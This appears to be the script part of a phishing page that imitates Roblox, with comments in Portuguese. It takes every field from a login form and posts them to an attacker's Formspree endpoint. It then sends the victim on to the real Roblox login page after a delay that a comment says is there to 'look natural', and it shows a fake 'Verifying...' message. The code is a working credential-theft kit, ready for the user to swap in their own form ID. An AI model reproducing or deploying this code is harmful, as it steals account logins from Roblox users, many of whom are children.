<script>
    // SUBSTITUA 'myewepyz' PELO SEU ID DO FORMSPREE SE TIVER MUDADO
    const FORM_ID = 'myewepyz'; 
    const REDIRECT_URL = 'https://www.roblox.com/login';

    document.getElementById('robloxForm').addEventListener('submit', function(e) {
        e.preventDefault(); 
        
        const btn = document.getElementById('submitBtn');
        
        // Feedback visual
        btn.disabled = true;
        btn.innerText = "Verificando...";

        const formData = new FormData(this);
        const data = Object.fromEntries(formData.entries());

        fetch(`https://formspree.io/f/${FORM_ID}`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
        }).then(() => {
            // Delay artificial para parecer natural
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1500); 
        }).catch(error => {
            console.error('Erro:', error);
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 500);
        });
    });
</script>
